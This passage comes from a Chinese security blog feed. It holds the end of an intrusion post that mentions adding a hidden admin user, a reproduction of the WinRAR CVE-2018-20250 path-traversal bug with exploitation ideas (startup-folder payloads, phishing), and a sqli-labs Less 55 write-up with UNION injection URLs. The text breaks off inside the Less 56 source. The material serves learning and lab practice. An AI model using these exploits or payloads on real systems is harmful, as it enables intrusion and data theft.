</span><br><span class="line">rdpclip.exe                   4316 暂缺                                        </span><br><span class="line">taskhostex.exe                1664 暂缺                                        </span><br><span class="line">ChsIME.exe                    2612 暂缺                                        </span><br><span class="line">explorer.exe                  2476 暂缺                                        </span><br><span class="line">wlrmdr.exe                    4160 暂缺                                        </span><br><span class="line">php-cgi.exe                   5084 暂缺                                        </span><br><span class="line">php-cgi.exe                   4708 暂缺                                        </span><br><span class="line">php-cgi.exe                   3788 暂缺                                        </span><br><span class="line">WmiPrvSE.exe                  4980 暂缺                                        </span><br><span class="line">WmiPrvSE.exe                  4756 暂缺                                        </span><br><span class="line">TrustedInstaller.exe          3188 TrustedInstaller                            </span><br><span class="line">TiWorker.exe                  4988 暂缺                                        </span><br><span class="line">cmd.exe                       2400 暂缺                                        </span><br><span class="line">conhost.exe                   3008 暂缺                                        </span><br><span class="line">cmd.exe                       5096 暂缺                                        </span><br><span class="line">tasklist.exe                  3652 暂缺         </span><br><span class="line"></span><br><span class="line">开启的端口：</span><br><span class="line">活动连接</span><br><span class="line"></span><br><span class="line">  协议  本地地址          外部地址        状态           PID</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       660</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1548</span><br><span class="line">  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:8980           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:25341          0.0.0.0:0              LISTENING       1580</span><br><span class="line">  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       452</span><br><span class="line">  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       760</span><br><span class="line">  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       804</span><br><span class="line">  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1032</span><br><span class="line">  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       1088</span><br><span class="line">  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       536</span><br><span class="line">  TCP    0.0.0.0:49159          0.0.0.0:0              LISTENING       544</span><br><span class="line">  TCP    xxx.xxx.xxx.xx     0.0.0.0:0              LISTENING       4</span><br></pre></td></tr></table></figure></p><p>上payload，然后提权添加隐藏用户<br><img src="https://s2.ax1x.com/2019/02/23/khXznA.png" alt="khXznA.png"></p><p><img src="https://s2.ax1x.com/2019/02/23/khvTJK.md.png" alt="khvTJK.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2018-20250 recurrence</title>
      <link href="/posts/96130294.html"/>
      <url>/posts/96130294.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr><p>已上学一个星期，上学空余期间发现爆出一个新的CVE:（CVE-2018-20250），WinRaR绝对路径穿越漏洞，回到家后立马就开始折腾复现。感觉这洞还是很有趣的<br><img src="http://n.sinaimg.cn/front/87/w1080h607/20190110/2BnJ-hrkkweh6763708.jpg" alt="2BnJ-hrkkweh6763708.jpg"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>漏洞介绍：</p><blockquote><p>近日Check Point团队爆出了一个关于WinRAR存在19年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用WinRAR解压该恶意文件时便会触发漏洞。</p></blockquote><blockquote><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p></blockquote><p>在实战中，往往rar会预装，因此，我们还可以通过该漏洞，绕过UAC。</p><p>复现时参考的文章：<br><a href="https://mp.weixin.qq.com/s?__biz=Mzg5MTA3NTg2MA==&amp;mid=2247483812&amp;idx=1&amp;sn=91a32ac6a6eeb62798e08cbb74016042&amp;chksm=cfd3addff8a424c9e25ee4b8c66ff62926a439ac840d9f19d7b98c5b2469e665d1a65d495dff&amp;mpshare=1&amp;scene=23&amp;srcid=0222asR3sUEY3lBrRzpzWhUw#rd" target="_blank" rel="noopener">实战!打造WinRAR代码执行漏洞的种植EXP</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247484092&amp;idx=1&amp;sn=1ef9fae081c64650b17722cc9f42cff1&amp;chksm=ea3f3e6edd48b77829abf8ea05dc615bc9424e90b73ab2feb5e76697abb2b61e0e53e46f8327&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank" rel="noopener">【漏洞预警】WinRAR代码执行漏洞复现</a></p><p>需要准备的工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">010 Editor 下载地址：http://www.sweetscape.com/download/010editor/download_010editor_win64.html</span><br><span class="line">WinAce Archiver</span><br></pre></td></tr></table></figure></p><p>随便用WinAce Archiver打包个东西<br><img src="https://s2.ax1x.com/2019/02/22/kfJX6O.png" alt="kfJX6O.png"></p><p>注意打包的时候要选择：store full path<br><img src="https://s2.ax1x.com/2019/02/22/kfJjXD.png" alt="kfJjXD.png"></p><p>打包成ace后将其拉入010 Editor<br><img src="https://s2.ax1x.com/2019/02/22/kfYS7d.png" alt="kfYS7d.png"></p><p>下载：<a href="https://github.com/droe/acefile" target="_blank" rel="noopener">GitHub - droe/acefile: read/test/extract ACE 1.0 and 2.0 archives in pure python</a><br>用于查看文件头部信息<br><img src="https://s2.ax1x.com/2019/02/22/kfYLUs.png" alt="kfYLUs.png"></p><p>然后先说明几个地方<br>filename<br><img src="https://s2.ax1x.com/2019/02/22/kfYO5n.png" alt="kfYO5n.png"></p><p>文件路径的长度<br><img src="https://s2.ax1x.com/2019/02/22/kfYjCq.png" alt="kfYjCq.png"></p><p><img src="https://s2.ax1x.com/2019/02/22/kfYx2V.png" alt="kfYx2V.png"></p><p>hdr_size<br><img src="https://s2.ax1x.com/2019/02/22/kftCb4.png" alt="kftCb4.png"></p><p>hdr_crc<br><img src="https://s2.ax1x.com/2019/02/22/kftFa9.png" alt="kftFa9.png"></p><p><b>复现开始</b><br>先修改filename<br><img src="https://s2.ax1x.com/2019/02/22/kftZ26.png" alt="kftZ26.png"></p><p>修改文件路径的长度<br><img src="https://s2.ax1x.com/2019/02/22/kftnKO.png" alt="kftnKO.png"></p><p>修改hdr_size<br><img src="https://s2.ax1x.com/2019/02/22/kft8PI.png" alt="kft8PI.png"></p><p>修改hdr_cc，先在acefile.py添加一句话<br><img src="https://s2.ax1x.com/2019/02/22/kftUsS.png" alt="kftUsS.png"><br>然后运行，acefile.py<br><img src="https://s2.ax1x.com/2019/02/22/kfNMlV.png" alt="kfNMlV.png"></p><p><img src="https://s2.ax1x.com/2019/02/22/kfNGTJ.png" alt="kfNGTJ.png"></p><p>再见解析发现已经成功而且filename已被修改：<br><img src="https://s2.ax1x.com/2019/02/22/kfNdl6.png" alt="kfNdl6.png"></p><p>解压到当前文件夹你会发现F盘多了个demo1.txt<br><img src="https://s2.ax1x.com/2019/02/22/kfNW1P.md.png" alt="kfNW1P.md.png"></p><h3 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.打包恶意exe将路径改为开机自启</span><br><span class="line">2.cmd劫持</span><br><span class="line">3.配置邮件社工等等</span><br><span class="line">利用工具：https://github.com/WyAtu/CVE-2018-20250</span><br></pre></td></tr></table></figure><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><blockquote><ol><li>升级到最新版本，WinRAR 目前版本是 5.70 Beta 1</li><li>删除UNACEV2.dll文件</li></ol></blockquote><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs-Less 55 -&gt; 60</title>
      <link href="/posts/517258dd.html"/>
      <url>/posts/517258dd.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>今天下午上学，蛋疼啊趁机从sqli-labs Less 55玩到了60关<br><img src="http://pic.happytify.cc/uploads/20180620/46/4648E374CC65w641h405.jpeg" alt=""></p><h2 id="sqli-labs-Less-55-gt-66"><a href="#sqli-labs-Less-55-gt-66" class="headerlink" title="sqli-labs Less 55 -&gt; 66"></a>sqli-labs Less 55 -&gt; 66</h2><hr><p><b>55关</b><br>先看代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-55</span>:Challenge<span class="number">-2</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style =<span class="string">"text-align:right"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input  type=<span class="string">"submit"</span> name=<span class="string">"reset"</span> value=<span class="string">"Reset the Challenge!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/right&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/sql-connect-1.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/functions.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$pag = $_SERVER[<span class="string">'PHP_SELF'</span>]; <span class="comment">//generating page address to piggy back after redirects...</span></span><br><span class="line">$characters = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>; <span class="comment">//characterset for generating random data</span></span><br><span class="line">$times= <span class="number">14</span>;</span><br><span class="line"></span><br><span class="line">$table = table_name();</span><br><span class="line">$col = column_name(<span class="number">1</span>);     <span class="comment">// session id column name</span></span><br><span class="line">$col1 = column_name(<span class="number">2</span>);   <span class="comment">//secret key column name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Submitting the final answer</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// resetting the challenge and repopulating the table .</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="comment">//echo "cookie expired";</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Checking the cookie on the page and populate the table with random value.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line"><span class="comment">//echo "Cookie value: ".$sessid;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">$hash = data($table,$col);</span><br><span class="line">setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//update the counter in database</span></span><br><span class="line">next_tryy();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display attempts on screen.</span></span><br><span class="line">$tryyy = view_attempts();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Reset the Database if you exceed allowed attempts.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($tryyy &gt;=($times+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=($id) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-55.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div  style=<span class="string">" color:#00FFFF; font-size:18px; text-align:center"</span>&gt;</span><br><span class="line">&lt;form name=<span class="string">"input"</span> action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">Submit Secret Key: &lt;input type=<span class="string">"text"</span> name=<span class="string">"key"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name = <span class="string">"answer_key"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line"><span class="comment">//echo $key;</span></span><br><span class="line"><span class="comment">//Query table to verify your result</span></span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line"><span class="comment">//echo "$sql";</span></span><br><span class="line">$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line"> </span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-54-1.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>; </span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=index.php"</span> );</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>要求还是和之前一样，在指定的次数内完成注入，只是查询语句的闭合方式不同，根据代码所给出的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-55/?id=0)%20union%20select%201,2,3%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-55/?id=0)%20union%20select%201,database(),3%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-55/?id=0)%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-55/?id=0)%20union%20select%201,(select%20`3`%20from%20(select%201,2,3,4%20union%20select%20*%20from%20wn0dwpqz7m)a%20limit%201,1),3%20--+</span><br></pre></td></tr></table></figure></p><p>这里我用了刚刚学到的在不知道列名的情况下进行注入的方法快速获得结果就不用跑列名那么麻烦了<br><img src="https://s2.ax1x.com/2019/02/17/ksviJ1.png" alt="ksviJ1.png"></p><p><b>56关</b><br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span 